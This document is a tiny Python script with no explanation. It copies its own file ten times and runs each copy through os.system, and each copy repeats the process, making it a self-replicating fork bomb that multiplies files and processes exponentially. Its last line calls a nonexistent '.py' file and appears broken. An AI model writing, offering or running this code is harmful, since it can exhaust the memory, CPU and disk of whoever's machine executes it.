import os
file=os.path.basename(__file__)

for i in range(10):
    os.system(f"copy {file} {i}{file}")
    os.system(f"python ./{i}{file}")
    os.system(f"python .py")